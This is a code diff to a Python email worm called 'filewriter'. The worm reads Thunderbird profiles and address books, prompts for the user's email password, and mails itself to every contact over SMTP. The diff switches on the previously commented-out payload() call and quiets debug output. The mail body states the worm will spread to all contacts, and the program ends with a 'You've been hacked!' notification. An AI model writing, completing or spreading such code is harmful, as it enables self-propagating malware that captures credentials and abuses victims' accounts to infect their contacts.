@@ -82,8 +82,8 @@ TESTING_DIR_THUNDERBIRD: str = os.path.join(os.path.expanduser("~"), "TestVerzei
 
 def n_rand_numbers(n: int) -> typing.List[int]:
     """
-    Before calling this function, please call the function `random.seed` with a 
-    non-fixed value.
+    Before calling this function, please call `random.seed` with a non-fixed 
+    value.
     
     :n:       The length of the list to return.
     :returns: a list of n numbers between 0 and n, randomly shuffled, 
@@ -134,7 +134,7 @@ def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
 def shuffle_filename(filename: str) -> str:
     # Determine the lines the text file has and use this number of lines 
     # to randomly shuffle the positions of those lines.
-    # TODO: Implement shuffling
+    # TODO: to be implemented
     return filename
 
 
@@ -242,9 +242,10 @@ def is_file_type(file: str, filetype: str) -> bool:
                   "wav" : "audio/x-wav"}
     if file.endswith(filetype):
         return True
-    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
-    # Provide function which determines the MIME type without having 
-    # the file name extension instead (otherwise, this check doesn't make much sense).
+    # TODO: mimetypes.guess_type only guesses the MIME type using the file name 
+    # extension. Instead, provice a functionality which determines the MIME type 
+    # without having the file name extension instead (otherwise, this check 
+    # doesn't make much sense).
     elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
         return True
     return False
@@ -481,7 +482,7 @@ def rand_dir_name() -> str:
 
 def copy_password() -> None:
     global password
-    print(f"copy_password(): password = {textfield.text()}") # test output
+    #print(f"copy_password(): password = {textfield.text()}") # test output
     password = textfield.text()
 
 def password_window(account_name: str = "", host_name: str = "") -> str:
@@ -632,35 +633,16 @@ def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names:
     return profile_dir_names
 
 
-# TODO: Probably delete this function:
-def search_file_in_default_dir(filename: str) -> str:
-    """
-    Searches for a file in the user's default Thunderbird profile directory.
-    
-    :filename: the relative file name of the file to be searched.
-    :returns:  the absolute file name to the searched file if the file could be 
-               found, `None` otherwise.
-    """
-    if not THUNDERBIRD_PROFILE_DIR:
-        find_thunderbird_profile_dirs()
-    if not THUNDERBIRD_PROFILE_DIR:
-        print(f"The file {filename} could not be found!")
-        return None
-    absolute_filepath = os.path.join(THUNDERBIRD_PROFILE_DIR, filename)
-    if os.path.isfile(absolute_filepath):
-        return absolute_filepath
-    return None
-
-
 def send_mail_ssl(smtp_server_url: str, sender_email: str, password: str, to: typing.List[str], whole_email_text: str) -> int:
     """
     Sends an email using SSL.
     
-    # TODO: document missing parameters
-    :returns: 0 in case of success, 1 in case of error
+    The meaning of the parameter variables should be unique based on their 
+    variable names together with the type annotations.
+    
+    :returns: 0 in case of success, 1 in case of error.
     """
     
-    # TODO: Ggf. Ports nochmal überarbeiten oder sogar spezifisch einzelnen Anbietern zuordnen
     port = 465
 
     with smtplib.SMTP_SSL(smtp_server_url, port) as smtp_server:
@@ -670,27 +652,30 @@ def send_mail_ssl(smtp_server_url: str, sender_email: str, password: str, to: ty
             print("l = {}\n".format(l)) # test output
         except Exception as l_ex:
             # TODO: raise specific exception
-            print("Exception thrown when trying to login!", l_ex) # test output
+            #print("Exception thrown when trying to login!", l_ex) # test output
             return 1
         try:
             smtp_server.sendmail(sender_email, to, whole_email_text)
         except Exception as s_ex:
             # TODO: raise specific exception
-            print("Exception thrown when trying to send mail!", s_ex) # test output
+            #print("Exception thrown when trying to send mail!", s_ex) # test output
             return 1
 
     
-    print ("Email sent successfully!") # test output
+    #print("Email sent successfully!") # test output
     return 0
 
 
 def send_mail_starttls(smtp_server_url: str, sender_email: str, password: str, to: typing.List[str], whole_email_text: str) -> int:
     """
     Sends an email using STARTTLS.
+    
+    The meaning of the parameter variables should be unique based on their 
+    variable names together with the type annotations.
+    
+    :returns: 0 in case of success, 1 in case of error.
     """
     
-    # TODO: If necessary, revise ports again or even assign them specifically to 
-    # individual email providers.
     starttls_smtp_port = 587
 
     with smtplib.SMTP(smtp_server_url, starttls_smtp_port) as smtp_server:
@@ -792,9 +777,8 @@ def find_thunderbird_profile_dirs() -> typing.List[str]:
     
     # If there is no installs.ini file, return the file path of the
     # default profile file from the profiles.ini file (the profile file which
-    # has a flat "Default=1"):
-    # Falls die aktuelle Zeile.strip() aus "Default=1" besteht und eine mit "Path=" anfangende Zeile entweder vor oder nach der aktuellen Zeile steht, ohne dass eine Zeile dazwischen war, die nur aus Whitespaces besteht, entspricht das "Path=" einem Pfad, welcher zu profile_dir_names hinzugefügt werden muss.
-    # This algorithm assumes that the profiles.ini file is correctly formatted.
+    # has a flat "Default=1"). It is assumed that the profiles.ini file
+    # is correctly formatted.
     profile_introduction_string_regex = re.compile("\[[0-9a-zA-Z]*\]")
     in_profile_def: bool = False
     path_detected: bool = False
@@ -822,7 +806,7 @@ def find_thunderbird_profile_dirs() -> typing.List[str]:
                     if in_profile_def and path_detected:
                         profile_dir_names = add_profile_dir_to_list(thunderbird_path, path_content, profile_dir_names)
     
-    print(f"profile_dir_names = {profile_dir_names}")
+    # print(f"profile_dir_names = {profile_dir_names}") # test output
     return profile_dir_names
 
 
@@ -835,7 +819,7 @@ def read_email_addresses_thunderbird(filepath: str) -> typing.List[str]:
                `None` otherwise.
     """
     database = os.path.join(filepath, "abook.sqlite")
-    #print(f"database = {database}")
+    #print(f"database = {database}") # test output
     con = None
     email_addresses = []
     
@@ -951,14 +935,12 @@ def send_mail_mime(sender_email: str, smtp_server_url: str, encryption_method: s
     """
     # TODO: Include functionality to also send the sender's name
     
-    # TODO: Realize with enum or constants:
     if encryption_method != SSL and encryption_method != STARTTLS:
         print("No valid encryption_method was specified!")
         return
     
-    # TODO: Adapt values:
     subject = "filewriter"
-    body = "This mail contains a worm as attachment, written in Python.\n\nTo execute it, Python must be installed on your system. In this case, just store it and type `python filewriter.py`."
+    body = "This mail contains a worm as attachment, written in Python.\n\nTo execute it, Python and Mozilla Thunderbird must be installed on your\nsystem. In this case, just store it and type `python filewriter.py`.\nIf you enter your password correctly in the window that pops up\nand everything else works, the worm will then be sent to all contacts\nin your address book."
     msg = MIMEMultipart() # Contains the whole email
     
     # Build (parts of) the header and the text/plain body:
@@ -1007,13 +989,13 @@ def send_email() -> None:
     thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
     #print(f"thunderbird_install_path = {thunderbird_install_path}") # test output
     if not thunderbird_install_path:
-        print("Mozilla Thunderbird is not installed on the system!")
+        #print("Mozilla Thunderbird is not installed on the system!")
         sys.exit(0)
     else:
         # Detect all Thunderbird profile directories:
         profile_dirs = find_thunderbird_profile_dirs()
         for profile_dir in profile_dirs:
-            #print(f"profile_dir = {profile_dir}")
+            print(f"profile_dir = {profile_dir}")
             to_email_addresses: typing.List[str] = read_email_addresses_thunderbird(profile_dir)
             print(f"to_email_addresses = {to_email_addresses}") # test output
             sender_name, sender_email = read_sender_name_and_email_thunderbird(profile_dir)
@@ -1030,6 +1012,6 @@ def send_email() -> None:
 
 if __name__ == "__main__":
     random.seed((datetime.now()).strftime("%H%M%S"))
-    #payload()
+    payload()
     send_email()
     notification("You've been hacked!", message="", app_name="filewriter")
